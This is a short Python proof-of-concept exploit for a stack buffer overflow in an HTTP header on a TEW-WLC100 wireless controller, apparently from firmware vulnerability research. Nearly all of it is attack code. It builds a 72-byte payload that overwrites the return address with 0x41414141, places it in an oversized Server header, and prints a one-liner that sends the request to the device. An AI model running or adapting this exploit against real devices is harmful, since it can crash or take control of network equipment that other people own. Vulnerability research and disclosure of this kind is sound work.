#!/usr/bin/env python3
"""PoC: TEW-WLC100 nginx HTTP Server Header Stack Overflow | CWE-121 | CVSS 9.8"""
import socket, struct

PAYLOAD = b"A" * 68 + struct.pack(">I", 0x41414141)  # 68B to $ra
REQ = (b"GET / HTTP/1.1\r\n"
       b"Host: 192.168.10.1\r\n"
       b"Server: " + PAYLOAD + b"\r\n"
       b"Connection: close\r\n\r\n")

print("TEW-WLC100 nginx HTTP Header Stack Overflow PoC")
print(f"Payload: {len(PAYLOAD)} bytes -> overwrite $ra with 0x41414141")
print()
print("To test: python3 -c \"import socket; s=socket.socket(); s.connect(('WLC100_IP',80)); s.send({REQ!r}); s.close()\"")
print()
print("FirmRec: 5 simexp logs confirm Return to 0x41414141")
